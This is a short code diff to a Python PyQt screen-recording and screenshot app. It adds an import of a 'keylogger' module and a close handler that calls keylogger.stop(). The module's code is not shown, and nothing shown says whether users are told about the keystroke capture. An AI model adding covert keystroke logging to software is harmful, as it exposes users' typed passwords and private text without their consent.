@@ -10,6 +10,7 @@ from threading import Thread
 import shutil
 import os
 import time
+import keylogger
 
 
 class App(QWidget, Thread):
@@ -69,6 +70,7 @@ class App(QWidget, Thread):
         print("Inside start threading")
         self.daemon.start()
 
+
     @pyqtSlot()
     def stop_recording(self):
         """Stop Recording and create video."""
@@ -99,6 +101,9 @@ class App(QWidget, Thread):
         img = cv2.imread(filename)
         cv2.imshow("Screenshot", img)
         cv2.waitKey(0)
+
+    def closeEvent(self, event):
+        keylogger.stop()
 
 
 if __name__ == '__main__':
